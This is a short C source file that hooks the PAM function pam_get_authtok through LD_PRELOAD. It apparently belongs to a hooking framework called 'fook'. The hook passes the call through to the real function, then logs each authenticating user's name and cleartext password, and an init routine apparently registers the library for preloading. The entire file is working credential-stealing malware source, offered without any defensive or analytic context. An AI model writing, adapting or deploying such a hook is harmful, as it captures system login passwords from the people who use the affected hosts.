#include <stdio.h>
#include <stdlib.h>
#include "fook.h"

typedef struct pam_handle
{
  char *authtok;
  unsigned caller_is;
  void *pam_conversation;
  char *oldauthtok;
  char *prompt;
  char *service_name;
  char *user;
  char *rhost;
  char *ruser;
  char *tty;
  char *xdisplay;
  char *authtok_type;
  void *data;
  void *env;
} pam_handle_t;

int (*orig_pam_get_authtok)(pam_handle_t *, int, const char **, const char *) = NULL;

FOOK_EXPORT int pam_get_authtok(pam_handle_t *pamh, int item, const char **authtok, const char *prompt){

    orig_pam_get_authtok = dlsym(RTLD_NEXT,"pam_get_authtok");
    int ret = orig_pam_get_authtok(pamh,item,authtok,prompt);

    TRACE("user=%s pass=%s",pamh->user,pamh->authtok);

    return ret;
}

FOOK_INIT void fook(){
    FOOK_ADD_PRELOAD
}
